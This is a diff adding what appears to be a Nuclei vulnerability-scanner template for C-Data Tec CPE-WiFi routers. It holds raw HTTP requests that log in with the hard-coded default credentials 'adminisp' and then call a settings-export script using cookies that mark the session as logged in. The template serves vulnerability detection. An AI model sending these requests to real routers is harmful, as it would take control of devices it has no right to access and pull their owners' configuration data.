@@ -1,0 +1,40 @@
+id: c-data-cpe-wifi-default-password
+info:
+  name: C-Data Tec CPE-WiFi Router Default Password
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    C-Data Tec CPE-WiFi Router is a passive optical network client product. It is exploitable due to a default password vulnerability which allows attackers to control the entire platform.
+  reference:
+    - https://cdatatec.com.cn
+    - https://gobies.org/
+  tags: default-password
+http:
+  - raw:
+      - |
+        POST /cgi-bin/login/login_config_save.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        call_function=login&user_login=adminisp&pass_login=adminisp
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "2"
+  - raw:
+      - |
+        POST /cgi-bin/exporteettings.sh HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: timestamp=1; cooLogin=1; cooUser=adminisp
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
